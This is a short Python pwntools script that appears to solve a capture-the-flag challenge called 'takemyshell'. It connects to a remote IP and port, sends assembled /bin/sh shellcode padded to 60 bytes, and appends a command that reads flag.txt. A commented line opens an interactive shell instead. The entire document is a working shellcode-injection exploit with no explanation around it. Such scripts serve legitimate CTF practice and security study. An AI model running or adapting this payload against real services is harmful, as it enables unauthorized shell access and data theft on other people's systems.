#!/usr/bin/env python

from pwn import *

#sh = process('./takemyshell')
sh = remote("159.65.13.76", 62111)

STUFF_CAPACITY = 60

shellcode = asm(shellcraft.sh())

# send this payload and get the shell
#sh.sendline(shellcode)

# send this payload and get the flag automatic
sh.sendline(shellcode.ljust(STUFF_CAPACITY, 'A') + "cat flag.txt;exit")

sh.interactive()